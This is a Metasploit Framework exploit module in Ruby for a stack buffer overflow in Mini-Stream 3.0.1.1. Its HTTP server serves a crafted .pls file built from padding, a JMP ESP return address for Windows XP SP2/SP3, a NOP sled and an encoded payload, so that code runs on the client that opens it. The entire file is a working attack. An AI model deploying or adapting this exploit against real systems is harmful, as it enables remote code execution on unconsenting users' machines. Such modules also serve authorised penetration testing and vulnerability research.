# $Id: mini_stream.rb 14155 2011-11-04 08:20:43Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039; => &#039;Mini-Stream 3.0.1.1 Buffer Overflow Exploit&#039;,
            &#039;Description&#039; => %q{
                    This module exploits a stack buffer overflow in Mini-Stream 3.0.1.1
                By creating a specially crafted pls file, an an attacker may be able
                to execute arbitrary code.
            },
            &#039;License&#039; => MSF_LICENSE,
            &#039;Author&#039; =>
                [
                    &#039;CORELAN Security Team &#039;,
                    &#039;Ron Henry <rlh[at]ciphermonk.net>&#039;, # dijital1; Return address update
                ],
            &#039;Version&#039; => &#039;$Revision: 14155 $&#039;,
            &#039;References&#039; =>
                [
                    [ &#039;OSVDB&#039;, &#039;61341&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/10745&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Payload&#039; =>
                {
                    &#039;Space&#039; => 3500,
                    &#039;BadChars&#039; => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x26\x3d\x2b\x3f\x3a\x3b\x2d\x2c\x2f\x23\x2e\x5c\x30",
                    &#039;StackAdjustment&#039; => -3500
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039; =>
                [
                    [
                        &#039;Windows XP SP3 ENG&#039;,
                        {
                            &#039;Ret&#039;    => 0x7e429353,  # 0x7e429353 JMP ESP - USER32.dll
                            &#039;Offset&#039; => 17417
                        }
                    ],
                    [
                        &#039;Windows XP SP2 ENG&#039;,
                        {
                            &#039;Ret&#039;    => 0x7c941eed,  # 0x7c941eed JMP ESP - SHELL32.dll
                            &#039;Offset&#039; => 17417
                        }
                    ]
                ],
            &#039;Privileged&#039; => false,
            &#039;DisclosureDate&#039; => &#039;Dec 25 2009&#039;,
            &#039;DefaultTarget&#039; => 0))
 
        register_options(
            [
                OptString.new(&#039;URIPATH&#039;,  [ true,  &#039;The URI to use for this exploit&#039;, &#039;msf.pls&#039;])
            ], self.class)
    end
 
 
    def on_request_uri(cli, request)
        # Calculate the correct offset
        host = (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(cli.peerhost) : datastore[&#039;SRVHOST&#039;]
        host << ":#{datastore[&#039;SRVPORT&#039;]}/"
        offset = target[&#039;Offset&#039;] - host.length
 
        # Construct our buffer
        sploit = rand_text_alpha(offset)
        sploit << [target.ret].pack(&#039;V&#039;)
        sploit << make_nops(32)
        sploit << @p
 
        print_status("Sending malicous payload #{cli.peerhost}:#{cli.peerport}...")
        send_response(cli, sploit, {&#039;Content-Type&#039;=>&#039;application/pls+xml&#039;})
    end
 
    def exploit
        @p = payload.encoded
        super
    end
 
end



